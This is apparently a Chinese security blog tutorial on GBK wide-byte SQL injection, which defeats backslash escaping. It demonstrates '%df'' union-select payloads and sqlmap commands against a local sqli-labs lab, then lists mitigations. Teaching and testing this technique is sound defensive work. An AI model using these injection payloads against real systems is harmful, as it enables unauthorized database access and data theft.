---
layout: post
title: "1.4.1-SQL注入防御绕过-宽字节注入"
date: 2018-06-30
category: web安全
tags: sql注入
---

## 01 宽字节注入原理

> 什么是宽字节
> GB2312、GBK、GB8030、BIG5、Shift_JIS等这些都是常说的宽字节，实际为两字节。

站点可能为了防止SQL注入，会加\转义'，最后变成\'  

![]({{site.img_link}}/09/01.jpeg)

MySQL在使用GBK编码的时候，会认为两个字符为一个汉字。
使用%df'进行编码，两个字符组合，认为是一个汉字。  
注：前一个Ascii码大于128才能到汉字的范围

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/02.jpeg)

## 02 宽字节注入方法

	http://127.0.0.1/sqli-labs/Less-32/?id=%df' union select 1,(select user()),3--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/03.jpeg)

	http://127.0.0.1/sqli-labs/Less-32/?id=%df' union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3--+ // 查表

	sqlmap:
	sqlmap -u "http://127.0.0.1/Less-32/?id=1" // 判断id不是注入点 因为被转义

	sqlmap -u "http://127.0.0.1/Less-32/?id=1%df" // 通过宽字节注入

--- 

> 宽字节注入应对策略：
+ 使用utf-8,避免宽字节注入；
ps：不仅在gbk，韩文、日文等等都是宽字节，都有可能存在宽字节注入漏洞。

+ mysql_real_escape_string,mysql_set_charset('gbk',$conn) // 替换 和 编码 两个函数一起使用

+ 可以设置参数，charcater_set_client=binary // 设置mysql的连接参数，使用二进制模式

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/04.png)

































